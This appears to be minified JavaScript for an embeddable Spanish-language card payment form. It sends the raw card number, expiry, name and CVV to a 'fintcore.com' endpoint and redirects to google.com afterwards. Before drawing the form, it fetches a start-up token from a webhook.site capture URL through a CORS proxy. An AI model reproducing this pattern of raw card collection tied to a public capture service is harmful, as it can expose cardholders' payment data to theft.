const mastercardValidity=e=>{return!!e.value.match(/^(?:5[1-5][0-9]{14})$/)},validCVV=e=>{var t=new RegExp(/^[0-9]{3,4}$/);return null!=e&&1==t.test(e)},visaValidity=e=>{return!!e.value.match(/^(?:4[0-9]{12}(?:[0-9]{3})?)$/)},mediaQuery=()=>{window.matchMedia("(max-width: 600px)").addListener(function(e){var t=document.querySelector(".formGrid"),r=document.querySelectorAll(".formItem");e.matches?(t.style.gridTemplateColumns="1fr",r.forEach((e,t)=>{e.style.width="100%",1===t&&(e.style.justifySelf="start")})):(t.style.gridTemplateColumns="1fr 1fr",r.forEach((e,t)=>{e.style.width="92%",1===t&&(e.style.justifySelf="end")}))})},validateForm=e=>{let t=!0,r=checkCVV=!1;return e.forEach(e=>{""===e.value?(e.style.border="1px solid red",t=!1):(e.style.border="1px solid black","number-card"===e.name&&(r=visaValidity(e)||mastercardValidity(e),e.style.border=r?"1px solid black":"1px solid red"),"pass"===e.name&&(checkCVV=validCVV(e.value),e.style.border=checkCVV?"1px solid black":"1px solid red"))}),checkCVV||(t=!1),t=r?t:!1},getToken=async()=>{console.log("FETCHING TOKEN...");try{var e={method:"POST",headers:{Accept:"application/vnd.conekta-v2.0.0+json","Accept-Language":"es","content-type":"application/json","Access-Control-Allow-Origin":"*"},body:JSON.stringify({}),json:!0};return await fetch("https://cors-anywhere.herokuapp.com/https://webhook.site/b977d888-a7a4-4d5e-ae83-d6e581a34b48/a94f7cfa-ccf0-4d52-8468-b1de2fb38400/1",e).then(e=>e.json())}catch(e){console.error(e)}},getCustomer=async()=>{console.log(" GET COSTUMER...");try{return await fetch("https://internal.fintcore.com/card_payment/card/tokenize",{method:"POST",headers:{Accept:"application/vnd.conekta-v2.0.0+json","Accept-Language":"es","content-type":"application/json","Access-Control-Allow-Origin":"*","X-Requested-With":"XMLHttpRequest","private-key":""},body:{},json:!0}).then(e=>e.json()).catch(e=>(console.error(e),null))}catch(e){return console.error(e),e}},addCardToCustomer=async(e,t,r,a,o)=>{console.log("ADDING TO CUSTOMER...");e={public_key:e,pan:r,name_cc:t,sc:o,exp:a};try{var l={method:"POST",headers:{"Accept-Language":"es","content-type":"application/json"},body:JSON.stringify(e),json:!0};return await fetch("https://internal.fintcore.com/card_payment/card/assignToCustomer",l).then(e=>e.json()).catch(e=>(console.error("ERROR:",e),null))}catch(e){return console.error(e),e}},drawForm=(e,t)=>{var t=document.getElementById(t),t=(t.style.maxWidth="650px",t.style.width="90%",t.style.margin="2rem auto 1rem",t.innerHTML=`
    <section>
        <form id="cardForm">
            <label class="cardFormLabel" for="number-card">Numero de tarjeta</label>
            <input type="text" class="cardFormInput" name="number-card" required/>
            <div class="formGrid">
                <div class="formItem">
                    <label class="cardFormLabel">Fecha de Vencimiento</label>
                    <fieldset class="cardFormDate">
                        <input type="number" class="cardFormInput" name="expMonth" required/>
                        <div>/</div>
                        <input type="number" class="cardFormInput" name="expYear" required/>
                    </fieldset>
                </div>
                <div class="formItem">
                    <label class="cardFormLabel" for="pass">CVV</label>
                    <input type="password" class="cardFormInput" name="pass" required/>
                </div>
            </div>
            <label class="cardFormLabel" for="name">Nombre como aparece en tarjeta</label>
            <input type="text" class="cardFormInput" name="name" required/>
            <input type="submit" class="cardFormButton" value="Finalizar"/>
        </form>
    </section>
    `,document.getElementById("cardForm")),t=(t.style.margin="1rem auto",t.style.display="grid",t.style.minWidth="300px",t.style.padding="0.4rem 0.4rem",document.querySelector(".formGrid")),r=document.querySelectorAll(".formItem"),t=(t.style.display="grid",t.style.gridTemplateColumns="1fr 1fr",r.forEach((e,t)=>{e.style.display="grid",e.style.width="92%",1===t&&(e.style.justifySelf="end")}),(inputDate=document.querySelectorAll(".cardFormDate .cardFormInput")).forEach(e=>{e.style.width="20%"}),document.querySelector(".cardFormDate")),r=(t.style.display="flex",t.style.justifyContent="space-around",t.style.alignItems="center",t.style.border="none",document.querySelectorAll(".cardFormLabel")),t=document.querySelectorAll(".cardFormInput");const c=Array.prototype.slice.call(t);c.map((e,t)=>{e.style.marginTop="8px",e.style.marginBottom="0.6rem",e.style.height="24px",e.style.border="1px solid black",e.style.borderRadius="4px",1===t&&(e.style.alignSelf="end")});Array.prototype.slice.call(r).map((e,t)=>{e.style.fontSize="0.8rem"});t=document.querySelector(".cardFormButton");t.style.maxWidth="300px",t.style.minWidth="180px",t.style.marginTop="16px",t.style.height="32px",t.style.justifySelf="center",t.onclick=async e=>{e.preventDefault();let t={};if(c.map(e=>{t={...t,[e.name]:""+e.value}}),validateForm(c))try{console.log("VALIDATE");var r=c[0].value,a=c[1].value+"/"+c[2].value,o=c[3].value,l=c[4].value,n=await addCardToCustomer(configExt.publicKey,l,r,a,o);200===n.code?(console.log(n.request),window.location.href="https://www.google.com"):alert("Información invalida, intentalo de nuevo")}catch(e){console.error(e),alert("Información invalida, reiniciando el proceso....")||window.location.reload()}else console.log("Revisa la informacion")}},mainProcess=async()=>{var e=(await getToken())?.data;e&&(drawForm(e,configExt.targetIFrame),mediaQuery())},withOutToken=async()=>{};setTimeout(()=>{mainProcess()},200);